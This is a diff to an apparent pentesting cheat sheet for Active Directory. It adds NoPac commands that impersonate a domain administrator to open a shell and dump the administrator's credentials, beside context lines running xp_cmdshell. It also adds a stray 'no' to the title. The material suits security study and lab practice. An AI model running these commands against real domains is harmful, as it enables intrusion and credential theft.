@@ -1,4 +1,4 @@
-# AD AND WINDOWS SCRIPT HINTS
+# AD AND WINDOWS SCRIPT HINTSno
 
 ## <mark style="color:red;">Kerbrute - Internal AD Username Enumeration</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
 
@@ -462,6 +462,20 @@ SQL> enable_xp_cmdshell
 
 # Exécution de commandes système
 SQL> xp_cmdshell whoami /priv
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">NoPac (SamAccountName Spoofing)</mark>
+
+{% code overflow="wrap" fullWidth="true" %}
+```shellscript
+$ sudo python3 noPac.py inlanefreight.local/user:password -dc-ip 172.16.5.5 \
+    -dc-host DC_NAME -shell --impersonate administrator -use-ldap
+    
+$ sudo python3 noPac.py inlanefreight.local/user:password -dc-ip 172.16.5.5 \
+    -dc-host DC_NAME --impersonate administrator -use-ldap -dump -just-dc-user inlanefreight/administrator
 ```
 {% endcode %}
 
